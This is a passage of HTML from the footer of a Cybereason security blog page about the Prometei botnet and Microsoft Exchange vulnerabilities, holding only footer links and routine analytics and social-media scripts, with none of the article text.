                <li><a href="https://www.cybereason.com/platform">Overview</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-prevention">Endpoint Protection</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-detection-response-edr">EDR</a></li>
                <li><a href="https://www.cybereason.com/platform/managed-detection-response-mdr">MDR</a></li>
              </ul>
            </div>
          </div>
      </div>
    </div>
  
    <div class="container page-center">
      <div class="columns cr-footer__bottom-bar">
        <div class="column">
          <p>©Cybereason 2025. All Rights Reserved.</p>
        </div>
        <div class="column bottom-bar__links">
          <ul>
            <li><a href="https://www.cybereason.com/terms-of-use">Terms of Use</a></li>
            <li><a href="https://www.cybereason.com/privacy-notice">Privacy Notice</a></li>
            <li><a href="https://www.cybereason.com/ccpa-privacy-request">Do Not Sell</a></li>
            <li><a href="https://www.cybereason.com/security">Security</a></li>
            <!--<li><a href="#">Cookie Policy</a></li>-->
          </ul>
        </div>

        <div class="column bottom-bar__social">
          <ul>
            <li><a class="facebook" href="https://www.facebook.com/Cybereason/"></a></li>
            <li><a class="twitter" href="https://twitter.com/cybereason"></a></li>
            <li><a class="youtube" href="https://www.youtube.com/channel/UCOm7AaB0HiNH4Phe66sK0Ew"></a></li>
            <li><a class="linkedin" href="https://www.linkedin.com/company/cybereason"></a></li>
            <li><a class="instagram" href="https://www.instagram.com/cybereason"></a></li>
          </ul>
        </div>
    </div>
  </div>

</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="https://www.cybereason.com/hs-fs/hubfs/hub_generated/template_assets/1/42507089303/1741528346196/template_animatedModal.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/41681847227/1741488491170/module_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.js"></script>
<script src="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/41682410610/1741488492472/module_CR_-_Malicious_Life_Network_--_Main_Hero.min.js"></script>
<script src="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/48386556055/1741488537305/module_CR_-_HTML_PopUp_Window_--_IOCs.min.js"></script>
<script src="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/43300360745/1741488505140/module_CR_-_Malicious_Life_Network_--_Related_Posts.min.js"></script>
<script src="https://www.cybereason.com/hs-fs/hubfs/hub_generated/module_assets/1/86933076631/1741488758324/module_CR_-_Sticky_CTA_Bar.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cybereason.com\/blog\/research\/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities"]);
_hsq.push(["setPageId", "45555647643"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 45555647643,
    "legacyPageId": "45555647643",
    "contentFolderId": null,
    "contentGroupId": 5272851739,
    "abTestId": null,
    "languageVariantId": 45555647643,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/3354902.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "dd1b9fb2-86c3-409d-adc7-f3566bdf2f84",
    ticks: 1742501648445,
    page_id: 45555647643,
    
    content_group_id: 5272851739,
    portal_id: 3354902,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    
    analytics_page_id: "45555647643",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.432/js/index.js"></script>

<script>if ($('[id^="hs_form"]').length > 0) {
  var myInterval = setInterval(
  function() {
    var myFields = document.getElementsByClassName('hs-input');
    if (myFields.length > 0) {
      clearInterval(myInterval);
      for (var i = 0; i < myFields.length; i++) {
        var myField = myFields[i];
		var myTagName = myField.tagName.toLowerCase();
        if (myTagName == 'input' || myTagName == 'textarea') {
          if (myField.placeholder != null) {
            myField.placeholder = myField.placeholder.replace('*', '');
          }
        } else if (myTagName == 'select') {
          myField.options[0].innerHTML = myField.options[0].innerHTML.replace('*', '');
        }
      }
    }
  }, 100);
}
</script>

<div id="fb-root"></div>
  <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v3.0";
  fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


    <script>
function sticky_relocate() {
  var window_top = $(window).scrollTop();
  var div_top = $('#sticky-anchor').offset().top;
  if (window_top > div_top) {
    $('#sticky').addClass('stick');
  } else {
    $('#sticky').removeClass('stick');
  }
}

$(function() {
  $(window).scroll(sticky_relocate);
  sticky_relocate();
});
</script>
    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

<script type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=2&cb=1934952083" async></script></body></html>